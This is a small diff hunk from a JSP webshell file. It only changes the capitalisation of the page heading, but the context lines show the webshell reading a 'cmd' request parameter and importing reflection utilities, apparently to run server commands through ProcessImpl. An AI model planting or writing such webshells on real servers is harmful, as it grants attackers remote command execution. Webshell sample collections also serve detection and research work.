@@ -6,7 +6,7 @@
 <%@ page import="sun.reflect.misc.MethodUtil" %>
 <html>
 <body>
-<h2>java.lang.ProcessImpl JSP Webshell</h2>
+<h2>java.lang.ProcessImpl JSP WebShell</h2>
 <%
     try {
         final String s = request.getParameter("cmd");
